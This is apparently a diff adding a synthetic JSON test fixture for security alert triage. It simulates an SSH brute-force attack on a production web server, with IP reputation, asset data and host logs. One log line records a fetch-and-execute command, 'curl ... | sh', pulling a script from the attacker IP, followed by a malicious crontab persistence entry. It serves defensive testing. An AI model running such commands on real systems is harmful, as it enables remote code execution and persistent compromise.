@@ -1,0 +1,33 @@
+{
+  "_comment": "Synthetic example. IPs from RFC 5737 documentation ranges. Not a dataset case.",
+  "input": {
+    "alert": {
+      "id": "example-ssh-bruteforce",
+      "timestamp": "2026-01-10T08:02:00Z",
+      "title": "Multiple failed SSH logins followed by success",
+      "description": "48 failed SSH logins in 2 minutes on web-01 from 203.0.113.7, then 1 successful login as 'deploy'.",
+      "host": "web-01",
+      "source_ip": "203.0.113.7"
+    },
+    "logs": [
+      {"timestamp": "2026-01-10T08:00:00Z", "source": "sshd", "message": "Failed password for deploy from 203.0.113.7 port 51022 ssh2 (repeated 48 times)"},
+      {"timestamp": "2026-01-10T08:01:58Z", "source": "sshd", "message": "Accepted password for deploy from 203.0.113.7 port 51190 ssh2"}
+    ]
+  },
+  "fixtures": {
+    "ips": {
+      "203.0.113.7": {"reputation": "malicious", "tags": ["ssh-bruteforce", "scanner"], "country": "ZZ"}
+    },
+    "assets": {
+      "web-01": {"owner": "platform-team", "criticality": "high", "environment": "prod", "role": "public web server"}
+    },
+    "logs": {
+      "web-01": [
+        {"timestamp": "2026-01-10T08:00:00Z", "source": "sshd", "message": "Failed password for deploy from 203.0.113.7 port 51022 ssh2 (repeated 48 times)"},
+        {"timestamp": "2026-01-10T08:01:58Z", "source": "sshd", "message": "Accepted password for deploy from 203.0.113.7 port 51190 ssh2"},
+        {"timestamp": "2026-01-10T08:02:30Z", "source": "bash", "message": "deploy: curl -s http://203.0.113.7/x.sh | sh"},
+        {"timestamp": "2026-01-10T08:03:10Z", "source": "cron", "message": "new crontab entry for deploy: */5 * * * * /tmp/.x/run"}
+      ]
+    }
+  }
+}
